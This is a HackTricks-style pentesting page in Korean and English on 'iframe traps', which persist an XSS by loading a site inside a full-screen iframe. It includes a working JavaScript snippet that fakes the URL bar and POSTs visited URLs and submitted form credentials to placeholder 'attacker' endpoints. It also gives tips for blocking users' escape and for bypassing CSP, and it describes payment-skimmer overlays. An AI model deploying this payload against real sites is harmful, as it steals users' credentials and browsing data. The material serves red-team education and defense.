# Iframe Traps

{{#include ../banners/hacktricks-training.md}}

## 기본 정보

This form of abusing XSS via iframes to steal information from the user moving across the web page was originally published in these 2 post from trustedsec.com: [**here**](https://trustedsec.com/blog/persisting-xss-with-iframe-traps) **and** [**here**](https://trustedsec.com/blog/js-tap-weaponizing-javascript-for-red-teams).

공격은 XSS에 취약한 페이지에서 시작되며, **피해자가 XSS를 벗어나지 않도록** 웹 애플리케이션 전체를 차지하는 **iframe 내부에서 탐색하도록** 만들 수 있을 때 가능합니다.

XSS 공격은 기본적으로 웹 페이지를 화면의 100%를 차지하는 iframe으로 로드합니다. 따라서 피해자는 **자신이 iframe 안에 있다는 것을 알아차리지 못합니다**. 이후 피해자가 iframe 내부의 링크를 클릭해 페이지를 탐색하면(웹 내에서), arbitrary JS가 로드된 채로 이 탐색에서 얻은 정보를 훔치며 **iframe 내부에서 탐색하게 됩니다**.

또한 현실감을 높이기 위해 일부 **listeners**를 사용하여 iframe이 페이지의 위치를 변경할 때를 체크하고, 브라우저의 URL을 사용자가 브라우저를 통해 페이지를 이동한다고 생각하게 만드는 해당 위치로 업데이트할 수 있습니다.

<figure><img src="../images/image (1248).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png">https://www.trustedsec.com/wp-content/uploads/2022/04/regEvents.png</a></p></figcaption></figure>

<figure><img src="../images/image (1249).png" alt=""><figcaption><p><a href="https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png">https://www.trustedsec.com/wp-content/uploads/2022/04/fakeAddress-1.png</a></p></figcaption></figure>

또한 listeners를 이용해 피해자가 방문하는 다른 페이지뿐만 아니라 **작성된 폼**에 사용된 데이터(예: credentials?)를 전송하거나 **local storage를 탈취**하는 등 민감한 정보를 훔칠 수 있습니다.

물론 주요 제한사항은 **피해자가 탭을 닫거나 브라우저에 다른 URL을 입력하면 iframe에서 벗어날 수 있다**는 점입니다. 또 다른 방법은 **페이지를 새로고침(refresh the page)** 하는 것인데, 이는 iframe 내부에 새 페이지가 로드될 때마다 우클릭 컨텍스트 메뉴를 비활성화하거나 사용자의 마우스가 iframe 밖으로 나가는 것을 감지하여 브라우저의 새로고침 버튼을 클릭하려는 시도를 탐지함으로써 부분적으로 **방지(prevented)** 할 수 있습니다. 이 경우 브라우저의 URL이 원래 XSS에 취약한 URL로 업데이트되어 사용자가 새로고침하면 다시 오염됩니다(단, 이는 매우 은밀하지는 않습니다).

## 최신화된 trap (2024+)

* Use a **full‑viewport iframe** plus History/Navigation API to mimic real navigation.

<details>
<summary>Full-viewport iframe trap</summary>
```html
<script>
const i=document.createElement('iframe');
i.src=location.href;
i.style='position:fixed;inset:0;border:0;width:100vw;height:100vh;z-index:999999;background:#fff';
document.body.appendChild(i);
function sync(url){history.replaceState({},'',url);}
i.addEventListener('load',()=>{
const w=i.contentWindow;
['hashchange','popstate'].forEach(ev=>w.addEventListener(ev,()=>sync(w.location.href)));
w.addEventListener('click',()=>fetch('//attacker/log',{method:'POST',body:w.location.href}));
w.document.addEventListener('submit',ev=>{
const fd=new FormData(ev.target);
fetch('//attacker/creds',{method:'POST',body:new URLSearchParams(fd)});
},true);
});
</script>
```
</details>

* **Navigation API** (`navigation.navigate`, `currententrychange`)는 외부 URL 표시줄을 동기화하지만 실제 URL을 leak하지 않습니다.
* Go **fullscreen** 하여 브라우저 UI를 숨기고 자체 가짜 주소 표시줄/자물쇠 아이콘을 그리세요.

## Overlay & skimmer 사용

* 침해된 상점들은 호스팅된 payment iframes (Stripe, Adyen, etc.)을 실제 프레임은 아래에 두고 키 입력을 전달하는 **pixel‑perfect overlay**로 교체합니다. 때로는 레거시 validation APIs를 사용해 흐름이 끊기지 않도록 합니다.
* 최상위 프레임에 사용자를 가두면 URL 표시줄이 변경되지 않은 것을 눈치채기 전에 **autofill/password‑manager** 데이터를 캡처합니다.

## 2025 연구에서 관찰된 회피 기법

* `about:blank`/`data:` 로컬 프레임은 부모 오리진을 상속하여 일부 content‑blocker 휴리스틱을 우회하며; 중첩된 iframes는 확장 프로그램이 서드파티 프레임을 제거할 때에도 다시 생성될 수 있습니다.
* **Permission propagation**: 부모 `allow` 속성을 재작성하면 중첩된 공격자 프레임에 눈에 띄는 DOM 변경 없이 fullscreen/camera/microphone 권한을 부여합니다.

## Quick OPSEC 팁

* 마우스가 떠날 때 (`body`의 `mouseleave`) iframe에 다시 포커스하여 사용자가 브라우저 UI에 접근하는 것을 막으세요.
* 프레임 내부에서 컨텍스트 메뉴와 일반적인 단축키(`keydown`으로 `F11`, `Ctrl+L`, `Ctrl+T`)를 비활성화하여 탈출 시도를 지연시키세요.
* CSP가 인라인 스크립트를 차단하면 원격 bootstrapper를 주입하고 iframe에서 `srcdoc`을 활성화하여 페이로드가 메인 페이지의 적용된 CSP 외부에 위치하도록 하세요.

## 관련

{{#ref}}
clickjacking.md
{{#endref}}



## 참고자료

- [Iframe security exposed: blind spot fueling payment skimmer attacks (2025)](https://thehackernews.com/2025/09/iframe-security-exposed-blind-spot.html)
- [Local Frames: exploiting inherited origins to bypass blockers (2025)](https://arxiv.org/abs/2506.00317)
{{#include ../banners/hacktricks-training.md}}
